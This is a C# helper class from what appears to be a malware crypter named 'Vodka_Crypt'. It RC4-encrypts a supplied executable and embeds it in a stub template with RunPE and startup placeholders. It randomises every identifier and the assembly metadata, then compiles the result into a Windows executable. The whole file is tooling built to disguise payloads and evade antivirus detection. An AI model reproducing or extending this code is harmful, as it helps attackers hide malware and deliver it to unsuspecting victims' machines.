using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Text;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Vodka_Crypt.Properties;

namespace Vodka_Crypt
{
    class Helper
    {
        public static string GenKey(int int_0)
        {
            string[] array = new string[]
			{
				"a",
				"b",
				"c",
				"d",
				"h",
				"i",
				"j",
				"k",
				"l",
				"m",
				"n",
				"o",
				"p",
				"q",
				"r",
				"s",
				"t",
				"u",
				"v",
				"w",
				"x",
				"y",
				"z",
				"A",
				"B",
				"C",
				"D",
				"H",
				"I",
				"J",
				"K",
				"L",
				"M",
				"N",
				"O",
				"P",
				"Q",
				"R",
				"S",
				"T",
				"U",
				"V",
				"W",
				"X",
				"Y",
				"Z",
				"1",
				"2",
				"3",
				"4",
				"5",
				"6",
				"7",
				"8",
				"9",
				"0"
			};
            string text = string.Empty;
            VBMath.Randomize();
            checked
            {
                for (int i = 1; i <= int_0; i++)
                {
                    text += array[(int)Math.Round((double)(unchecked(VBMath.Rnd() * (float)(checked(array.Length - 1)))))];
                }
                return text;
            }
        }
        public static void PreCompiler(string string_0, string string_1, string string_2, string string_3 = "", string string_4 = "", string string_5 = "", bool bool_0 = false)
        {
            string text = Resources.ctb;//Resources.String_0;
            byte[] value = Encrypt(File.ReadAllBytes(string_0), Encoding.ASCII.GetBytes(string_1));
            string replacement = string.Empty;
            string text2 = Conversions.ToString(Operators.AddObject("_", GenKey(16)));
            text = Strings.Replace(text, "[key]", string_1, 1, -1, CompareMethod.Binary);
            if (bool_0)
            {
                replacement = "st." + text2 + "(\"[stname]\", \"[stfile]\");";
            }
            text = Strings.Replace(text, "[data]", BitConverter.ToString(value), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[start]", replacement, 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[stname]", string_4, 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[stfile]", string_5, 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[namespace]", Conversions.ToString(Operators.AddObject("_", GenKey(16))), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[encryption]", Conversions.ToString(Operators.AddObject("_", GenKey(16))), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[container]", Conversions.ToString(Operators.AddObject("_", GenKey(16))), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[runpe]", Conversions.ToString(Operators.AddObject("_", GenKey(16))), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[startup]", Conversions.ToString(Operators.AddObject("_", GenKey(16))), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[rc4]", Conversions.ToString(Operators.AddObject("_", GenKey(16))), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[run]", Conversions.ToString(Operators.AddObject("_", GenKey(16))), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[rstring]", Conversions.ToString(Operators.AddObject("_", GenKey(16))), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[getc]", Conversions.ToString(Operators.AddObject("_", GenKey(16))), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[str2byt]", Conversions.ToString(Operators.AddObject("_", GenKey(16))), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[create]", text2, 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[a:title]", Conversions.ToString(GenKey(16)), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[a:description]", Conversions.ToString(GenKey(16)), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[a:company]", Conversions.ToString(GenKey(16)), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[a:product]", Conversions.ToString(GenKey(16)), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[a:copyright]", Conversions.ToString(GenKey(16)), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[a:trademark]", Conversions.ToString(GenKey(16)), 1, -1, CompareMethod.Binary);
            text = Strings.Replace(text, "[a:version]", string.Concat(new string[]
		{
			Conversion.Int(VBMath.Rnd() * 9f).ToString(),
			".",
			Conversion.Int(VBMath.Rnd() * 9f).ToString(),
			".",
			Conversion.Int(VBMath.Rnd() * 9f).ToString(),
			".",
			Conversion.Int(VBMath.Rnd() * 9f).ToString()
		}), 1, -1, CompareMethod.Binary);
            Compiler(text, string_2, string_3);
        }

        public static void Compiler(string string_0, string string_1, string string_2 = "")
        {
            CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
            CompilerParameters compilerParameters = new CompilerParameters();
            compilerParameters.TreatWarningsAsErrors = false;
            compilerParameters.OutputAssembly = string_1;
            compilerParameters.GenerateExecutable = true;
            compilerParameters.GenerateInMemory = false;
            if (Operators.CompareString(string_2, "", false) != 0)
            {
                compilerParameters.CompilerOptions = "/win32icon:" + string_2;
            }
            CompilerParameters compilerParameters2 = compilerParameters;
            compilerParameters2.CompilerOptions += " /optimize+ /t:winexe /platform:x86";
            compilerParameters.ReferencedAssemblies.Add("System.dll");
            compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, new string[]
		{
			string_0
		});
        }

        private static byte[] Encrypt(byte[] byte_0, byte[] byte_1)
        {
            uint[] array = new uint[256];
            checked
            {
                byte[] array2 = new byte[byte_0.Length - 1 + 1];
                uint num = 0u;
                do
                {
                    array[(int)num] = num;
                    num += 1u;
                }
                while (num <= 255u);
                num = 0u;
                uint num2 = 0;
                do
                {
                    num2 = (uint)(unchecked((ulong)(checked(num2 + (uint)byte_1[(int)(unchecked((ulong)num % (ulong)((long)byte_1.Length)))] + array[(int)num]))) & 255uL);
                    uint num3 = array[(int)num];
                    array[(int)num] = array[(int)num2];
                    array[(int)num2] = num3;
                    num += 1u;
                }
                while (num <= 255u);
                num = 0u;
                num2 = 0u;
                int arg_7C_0 = 0;
                int num4 = array2.Length - 1;
                int num5 = arg_7C_0;
                while (true)
                {
                    int arg_ED_0 = num5;
                    int num6 = num4;
                    if (arg_ED_0 > num6)
                    {
                        break;
                    }
                    num = (uint)(unchecked((ulong)num) + 1uL & 255uL);
                    num2 = (uint)(unchecked((ulong)(checked(num2 + array[(int)num]))) & 255uL);
                    uint num3 = array[(int)num];
                    array[(int)num] = array[(int)num2];
                    array[(int)num2] = num3;
                    array2[num5] = (byte)((uint)byte_0[num5] ^ array[(int)(unchecked((ulong)(checked(array[(int)num] + array[(int)num2]))) & 255uL)]);
                    num5++;
                }
                return array2;
            }
        }
    }

}
